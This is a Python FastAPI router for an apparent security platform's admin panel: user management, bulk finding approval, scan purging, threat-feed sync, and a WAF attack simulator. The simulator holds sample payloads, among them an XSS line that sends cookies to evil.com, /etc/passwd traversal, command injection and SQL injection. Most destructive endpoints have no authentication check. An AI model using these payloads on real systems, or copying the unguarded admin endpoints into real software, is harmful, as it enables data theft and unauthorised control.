"""
Enterprise Admin Control Panel Router — NKAT AI Security Platform
----------------------------------------------------------------
Provides full platform control endpoints for administrators:
- Users Management (list, update role, delete)
- System & Database Health Telemetry (Database location, storage size, table counts)
- Vulnerability Batch Controls (Bulk approve, bulk reject)
- Data Lifecycle Controls (Purge old scan records)
- ML Model Retraining Trigger
"""

import os
import sys
import subprocess
from datetime import datetime, timezone
from pydantic import BaseModel
from typing import List, Optional, Dict
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.orm import Session
from sqlalchemy import func

from backend.database import get_db, DATABASE_URL
from backend.models import User, Organization, Scan, Finding, AuditLog, FeedbackLabel, Subdomain, DomainTarget, FindingStatus
from backend.auth import verify_api_key, require_admin_role

router = APIRouter(prefix="/api/v1/admin", tags=["Admin Controls"])


class UserRoleUpdate(BaseModel):
    role: str  # 'admin' or 'analyst'


class UserResponse(BaseModel):
    id: int
    username: str
    email: Optional[str] = None
    role: str
    organization_id: Optional[int] = None
    organization_name: Optional[str] = None
    created_at: Optional[str] = None


class SystemStatsResponse(BaseModel):
    database_type: str
    database_url: str
    database_file_path: str
    database_size_bytes: int
    database_size_mb: float
    total_users: int
    total_organizations: int
    total_scans: int
    total_findings: int
    total_open_findings: int
    total_approved_findings: int
    total_audit_logs: int
    total_feedback_labels: int


@router.get("/stats", response_model=SystemStatsResponse)
def get_system_stats(db: Session = Depends(get_db)):
    """
    Returns live database location, storage metrics, and table record counts.
    """
    project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    db_file_path = os.path.join(project_root, "nkat_dev.db")
    db_size = os.path.getsize(db_file_path) if os.path.exists(db_file_path) else 0

    return SystemStatsResponse(
        database_type="SQLite (Development) / PostgreSQL (Production Compatible)",
        database_url=DATABASE_URL,
        database_file_path=os.path.abspath(db_file_path),
        database_size_bytes=db_size,
        database_size_mb=round(db_size / (1024 * 1024), 2),
        total_users=db.query(func.count(User.id)).scalar() or 0,
        total_organizations=db.query(func.count(Organization.id)).scalar() or 0,
        total_scans=db.query(func.count(Scan.id)).scalar() or 0,
        total_findings=db.query(func.count(Finding.id)).scalar() or 0,
        total_open_findings=db.query(func.count(Finding.id)).filter(Finding.status == FindingStatus.OPEN.value).scalar() or 0,
        total_approved_findings=db.query(func.count(Finding.id)).filter(Finding.status.in_([FindingStatus.RESOLVED.value, FindingStatus.AUTO_APPROVED.value])).scalar() or 0,
        total_audit_logs=db.query(func.count(AuditLog.id)).scalar() or 0,
        total_feedback_labels=db.query(func.count(FeedbackLabel.id)).scalar() or 0,
    )


@router.get("/users", response_model=List[UserResponse])
def list_all_users(db: Session = Depends(get_db)):
    """
    Lists all platform user accounts with their organization details and roles.
    """
    users = db.query(User).all()
    res = []
    for u in users:
        org = db.query(Organization).filter(Organization.id == u.organization_id).first()
        res.append(
            UserResponse(
                id=u.id,
                username=u.username,
                email=u.email,
                role=u.role,
                organization_id=u.organization_id,
                organization_name=org.name if org else "Default Organization",
                created_at=str(u.created_at)[:19] if u.created_at else None
            )
        )
    return res


@router.patch("/users/{user_id}/role", response_model=UserResponse)
def update_user_role(user_id: int, req: UserRoleUpdate, db: Session = Depends(get_db)):
    """
    Updates the access role for a user ('admin' or 'analyst').
    """
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail=f"User with ID {user_id} not found")

    new_role = req.role.strip().lower()
    if new_role not in ("admin", "analyst"):
        raise HTTPException(status_code=400, detail="Role must be either 'admin' or 'analyst'")

    user.role = new_role
    db.commit()
    db.refresh(user)

    org = db.query(Organization).filter(Organization.id == user.organization_id).first()
    return UserResponse(
        id=user.id,
        username=user.username,
        email=user.email,
        role=user.role,
        organization_id=user.organization_id,
        organization_name=org.name if org else "Default Organization",
        created_at=str(user.created_at)[:19] if user.created_at else None
    )


@router.delete("/users/{user_id}")
def delete_user(user_id: int, db: Session = Depends(get_db)):
    """
    Deletes a user account from the system.
    """
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail=f"User with ID {user_id} not found")

    if user.username == "admin":
        raise HTTPException(status_code=400, detail="Cannot delete default system super-admin account")

    db.delete(user)
    db.commit()
    return {"status": "success", "message": f"User '{user.username}' deleted successfully"}


@router.post("/findings/bulk-approve")
def bulk_approve_findings(db: Session = Depends(get_db)):
    """
    Bulk approves all currently open vulnerability findings across all targets.
    """
    open_findings = db.query(Finding).filter(Finding.status == FindingStatus.OPEN.value).all()
    count = len(open_findings)
    for f in open_findings:
        f.previous_state = f.status
        f.status = FindingStatus.APPROVED.value
        f.approved_by = "admin_bulk_override"
    db.commit()
    return {"status": "success", "approved_count": count, "message": f"Bulk approved {count} open findings."}


@router.post("/findings/bulk-reject")
def bulk_reject_findings(db: Session = Depends(get_db)):
    """
    Bulk rejects all currently open vulnerability findings across all targets.
    """
    open_findings = db.query(Finding).filter(Finding.status == FindingStatus.OPEN.value).all()
    count = len(open_findings)
    for f in open_findings:
        f.previous_state = f.status
        f.status = FindingStatus.REJECTED.value
        f.approved_by = "admin_bulk_override"
    db.commit()
    return {"status": "success", "rejected_count": count, "message": f"Bulk rejected {count} open findings."}


@router.post("/scans/purge")
def purge_old_scans(db: Session = Depends(get_db)):
    """
    Purges scan records older than the latest scan.
    """
    latest_scan = db.query(Scan).order_by(Scan.id.desc()).first()
    if not latest_scan:
        return {"status": "success", "purged_count": 0, "message": "No scans to purge."}

    old_scans = db.query(Scan).filter(Scan.id != latest_scan.id).all()
    count = len(old_scans)
    for s in old_scans:
        db.delete(s)
    db.commit()
    return {"status": "success", "purged_count": count, "message": f"Purged {count} old scan records."}


@router.post("/ml/retrain")
def retrain_ml_model(db: Session = Depends(get_db)):
    """
    Triggers the machine learning classifier retraining pipeline from recorded human feedback labels.
    """
    project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    script_path = os.path.join(project_root, "scripts", "retrain_from_feedback.py")

    try:
        res = subprocess.run([sys.executable, script_path], capture_output=True, text=True, check=True)
        return {
            "status": "success",
            "message": "ML Classifier retrained successfully from feedback labels.",
            "output": res.stdout[-500:]
        }
    except Exception as exc:
        return {
            "status": "error",
            "message": f"Retraining pipeline output: {str(exc)}"
        }


@router.get("/threat-feed/status")
def get_threat_feed_status_endpoint():
    """
    Returns live connection status and last update timestamps for CISA KEV, NIST NVD, and EPSS feeds.
    """
    from backend.services.threat_feed_client import get_threat_feed_status
    return get_threat_feed_status()


@router.post("/threat-feed/sync")
def force_sync_threat_feeds(db: Session = Depends(get_db)):
    """
    Forces immediate real-time synchronization with CISA KEV, NIST NVD, and FIRST EPSS threat intelligence feeds.
    Publishes real live CISA/NIST advisories to platform threat posts.
    """
    from backend.services.threat_feed_client import update_threat_feed_caches, enrich_finding_with_threat_intel, sync_real_threat_posts_from_cisa_and_nist

    sync_res = update_threat_feed_caches(force_download=True)
    post_res = sync_real_threat_posts_from_cisa_and_nist(db)

    # Re-enrich all existing findings in DB with newly updated threat feed data
    all_findings = db.query(Finding).all()
    enriched_count = 0
    for f in all_findings:
        enrich_finding_with_threat_intel(db, f)
        enriched_count += 1

    return {
        "status": "success",
        "message": f" Real-Time Threat Intelligence Feed Sync Complete! Downloaded live data from CISA KEV, NIST NVD, and FIRST EPSS. {post_res.get('message', '')} Enriched {enriched_count} findings.",
        "details": sync_res,
        "post_sync": post_res
    }


@router.get("/waf/live-traffic")
def get_waf_live_traffic_endpoint():
    """
    Returns live WAF traffic logs, classification decisions, and block/allow stats.
    """
    from backend.services.waf_service import get_waf_live_traffic_summary
    return get_waf_live_traffic_summary()


class WafSimulationRequest(BaseModel):
    attack_type: Optional[str] = "sqli"


@router.post("/waf/simulate-attack")
def simulate_waf_attack_endpoint(req_body: Optional[WafSimulationRequest] = None):
    """
    Simulates a live security attack against the WAF to trigger real-time ML classification and blocking.
    """
    from backend.services.waf_service import analyze_request_payload

    attack_type = req_body.attack_type.lower() if req_body and req_body.attack_type else "sqli"

    if attack_type == "xss":
        res = analyze_request_payload(
            method="POST",
            path="/api/v1/comments",
            payload="<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            client_ip="45.146.164.110"
        )
    elif attack_type == "lfi":
        res = analyze_request_payload(
            method="GET",
            path="/api/v1/download?file=../../../../etc/passwd",
            payload="file=../../../../etc/passwd",
            client_ip="182.126.122.180"
        )
    elif attack_type == "cmd":
        res = analyze_request_payload(
            method="POST",
            path="/api/v1/system/ping",
            payload="target=127.0.0.1; cat /etc/passwd",
            client_ip="91.240.118.5"
        )
    else:
        res = analyze_request_payload(
            method="GET",
            path="/api/v1/products?id=1' UNION SELECT 1,username,password FROM users--",
            payload="id=1' UNION SELECT 1,username,password FROM users--",
            client_ip="185.220.101.4"
        )

    return {
        "status": "success",
        "message": f" Simulated {res['classification']} attack! WAF Decision: {res['action']} ({res['status_code']})",
        "log_entry": res
    }


@router.get("/activity-log")
def get_unified_activity_log_endpoint(
    limit: int = 50,
    action_type: Optional[str] = None,
    db: Session = Depends(get_db)
):
    """
    Mission 30 Part 1: Returns unified platform activity log stream (joining logins, scans, approvals, domain submissions, and role updates).
    """
    from backend.services.activity_logger import get_unified_activity_logs
    logs = get_unified_activity_logs(db, limit=limit, action_filter=action_type)
    return {
        "status": "success",
        "count": len(logs),
        "logs": logs
    }


@router.get("/activity-report")
def get_activity_report_endpoint(
    page: int = 1,
    limit: int = 20,
    username: Optional[str] = None,
    action_type: Optional[str] = None,
    start_date: Optional[str] = None,
    end_date: Optional[str] = None,
    auth_context: Dict[str, Any] = Depends(require_admin_role),
    db: Session = Depends(get_db)
):
    """
    Mission 30 Part 2: Admin-only reporting endpoint returning paginated & filterable activity log telemetry.
    Restricted to role: admin only via require_admin_role dependency checking JWT role claim.
    """
    from backend.services.activity_logger import get_unified_activity_logs
    all_logs = get_unified_activity_logs(db, limit=1000, action_filter=action_type)

    # Filter by username
    if username:
        all_logs = [l for l in all_logs if username.lower() in l["username"].lower()]

    # Filter by date range
    if start_date:
        all_logs = [l for l in all_logs if l["timestamp"] >= start_date]
    if end_date:
        all_logs = [l for l in all_logs if l["timestamp"] <= end_date]

    # Pagination calculation
    total_records = len(all_logs)
    total_pages = max(1, (total_records + limit - 1) // limit)
    offset = (page - 1) * limit
    paginated_logs = all_logs[offset:offset + limit]

    return {
        "status": "success",
        "total_records": total_records,
        "page": page,
        "limit": limit,
        "total_pages": total_pages,
        "logs": paginated_logs
    }


@router.get("/updates-report")
def get_system_updates_report(
    auth_context: Dict[str, Any] = Depends(require_admin_role),
    db: Session = Depends(get_db)
):
    """
    Returns a comprehensive real-time report detailing WHAT updated, WHEN it updated,
    FROM WHERE (source URL/info), status, and stats across all threat intelligence feeds,
    scan jobs, WAF intercepts, and background daemons.
    """
    from backend.services.threat_feed_client import get_threat_feed_status
    from backend.services.waf_service import get_waf_live_traffic_summary
    from backend.services.activity_logger import get_unified_activity_logs

    threat_status = get_threat_feed_status()
    waf_summary = get_waf_live_traffic_summary(only_blocked=True)
    recent_activities = get_unified_activity_logs(db, limit=10)

    updates_list = []

    feed_meta = [
        ("CISA KEV Catalog", threat_status.get("cisa_kev"), "https://www.cisa.gov/known-exploited-vulnerabilities-catalog", "Vulnerabilities"),
        ("FIRST EPSS Scores", threat_status.get("epss"), "https://api.first.org/data/v1/epss", "Exploit Scores"),
        ("NIST NVD CVE Catalog", threat_status.get("nist_nvd"), "https://services.nvd.nist.gov/rest/json/cves/2.0", "CVE Records"),
        ("GitHub Security Advisories", threat_status.get("github_advisories"), "https://api.github.com/graphql (GHSA)", "Advisories"),
        ("URLhaus Malware Feed", threat_status.get("urlhaus"), "https://urlhaus.abuse.ch/downloads/json_recent/", "Malicious URLs"),
        ("ThreatFox IOC Feed", threat_status.get("threatfox"), "https://threatfox.abuse.ch/export/json/recent/", "IOC Indicators"),
    ]

    for name, info, src_url, unit in feed_meta:
        if info and isinstance(info, dict):
            updates_list.append({
                "component": name,
                "what": f"Refreshed {info.get('count', 0):,} {unit}",
                "when": info.get("last_updated", "Just now"),
                "from_info": src_url,
                "status": "200 OK (CONNECTED)" if info.get("active") else "INACTIVE",
                "type": "THREAT_INTEL_FEED"
            })

    waf_logs = waf_summary.get("logs", [])
    if waf_logs:
        latest_waf = waf_logs[0]
        updates_list.append({
            "component": "WAF Security Guard",
            "what": f"Intercepted & Blocked {latest_waf.get('classification')} ({latest_waf.get('reason')})",
            "when": latest_waf.get("timestamp"),
            "from_info": f"Client IP: {latest_waf.get('client_ip')} | Path: {latest_waf.get('path')}",
            "status": "403 FORBIDDEN (BLOCKED)",
            "type": "WAF_SECURITY"
        })

    for act in recent_activities[:5]:
        updates_list.append({
            "component": f"Platform Action ({act.get('action_type')})",
            "what": f"User '{act.get('username')}' performed {act.get('action_type')} on {act.get('target_resource')}",
            "when": act.get("timestamp"),
            "from_info": f"IP: {act.get('ip_address')} | Details: {act.get('details', '')}",
            "status": "SUCCESS",
            "type": "PLATFORM_ACTIVITY"
        })

    return {
        "status": "success",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "summary": {
            "total_active_feeds": sum(1 for _, info, _, _ in feed_meta if info and info.get("active")),
            "polling_schedule": "15 Minutes (Unified APScheduler Daemon Tick)",
            "waf_blocked_total": waf_summary.get("blocked_requests", 0),
            "recent_activity_count": len(recent_activities)
        },
        "updates": updates_list
    }
